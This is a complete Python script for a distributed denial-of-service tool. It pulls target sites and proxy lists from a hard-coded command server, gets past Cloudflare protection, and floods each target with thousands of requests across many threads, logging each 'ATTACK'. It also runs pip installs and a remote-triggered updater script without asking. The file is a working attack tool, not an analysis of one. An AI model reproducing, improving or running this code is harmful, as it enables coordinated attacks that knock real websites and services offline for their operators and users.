import cloudscraper
import requests
import os
from bs4 import BeautifulSoup
from urllib.parse import unquote
from gc import collect
from loguru import logger
from os import system
from requests import get
from sys import stderr
from threading import Thread
from random import choice
from time import sleep
from urllib3 import disable_warnings
from pyuseragents import random as random_useragent
from json import loads

from urllib.request import urlopen
import json
import sys

VERSION = 2
HOSTS = ["http://46.4.63.238/api.php"]
MAX_REQUESTS = 5000
disable_warnings()
def clear(): return system('cls')
logger.remove()
logger.add(stderr, format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>")
threads = int(sys.argv[1])

def checkReq():
	os.system("python3 -m pip install -r requirements.txt")
	os.system("python -m pip install -r requirements.txt")
	os.system("pip install -r requirements.txt")
	os.system("pip3 install -r requirements.txt")

def checkUpdate():
	print("Checking Updates...")
	updateScraper = cloudscraper.create_scraper(browser={'browser': 'firefox','platform': 'android','mobile': True},)
	url = "https://gist.githubusercontent.com/AlexTrushkovsky/041d6e2ee27472a69abcb1b2bf90ed4d/raw/nowarversion.json"
	try:
		content = updateScraper.get(url).content
		if content:
			data = json.loads(content)
			new_version = data["version"]
			print(new_version)
			if new_version < VERSION:
				print("New version Available")
				os.system("python updater.py " + str(threads))
				os.system("python3 updater.py " + str(threads))
				exit()
		else:
			sleep(5)
			checkUpdate()
	except:
		sleep(5)
		checkUpdate()

def mainth():
	while True:
		scraper = cloudscraper.create_scraper(browser={'browser': 'firefox','platform': 'android','mobile': True},)
		scraper.headers.update({'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(), 'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https', 'Accept-Encoding': 'gzip, deflate, br'})
		logger.info("GET RESOURCES FOR ATTACK")
		content = scraper.get(choice(HOSTS)).content
		if content:
		    data = loads(content)
		else:
		    sleep(5)
		    continue
		logger.info("STARTING ATTACK TO " + data['site']['page'])
		site = unquote(data['site']['page'])
		if site.startswith('http') == False:
		    site = "https://" + site
		try:
		    attack = scraper.get(site)
		    if attack.status_code >= 200:
		        for proxy in data['proxy']:
		            scraper.proxies.update({'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
		            response = scraper.get(site)
		            if response.status_code >= 200 and response.status_code <= 302:
		                for i in range(MAX_REQUESTS):
		                    response = scraper.get(site)
		                    logger.info("ATTACKED; RESPONSE CODE: " + str(response.status_code))
		    else:
		        for i in range(MAX_REQUESTS):
		            response = scraper.get(site)
		            logger.info("ATTACKED; RESPONSE CODE: " + str(response.status_code))
		except:
		    logger.warning("issue happened")
		    continue


def cleaner():
	while True:
		sleep(60)
		checkUpdate()
		clear()
		collect()

if __name__ == '__main__':
    clear()
    checkReq()
    checkUpdate()
    for _ in range(threads):
        Thread(target=mainth).start()
    Thread(target=cleaner, daemon=True).start()
